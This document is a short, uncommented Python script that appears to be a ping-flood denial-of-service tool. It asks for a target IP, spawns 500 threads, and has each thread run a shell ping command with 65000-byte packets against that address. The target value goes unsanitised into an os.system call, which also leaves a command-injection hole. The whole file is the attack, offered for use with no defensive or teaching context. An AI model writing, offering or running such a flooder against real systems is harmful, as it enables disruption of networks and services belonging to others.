import os
import threading
from queue import Queue

def pingJob(jobs):
    os.system("ping %s -l 65000 -w 1 -n 1 -t" %targetIP)

def threader():
    while True:
        jobs = q.get()
        pingJob(jobs)
        q.task_done()

print("Input target IP:")
targetIP = input()

q = Queue()

#Number of threads to create
for jobs in range(500):
    t = threading.Thread(target=threader)
    t.daemon = True
    t.start()
    q.put(jobs)

q.join()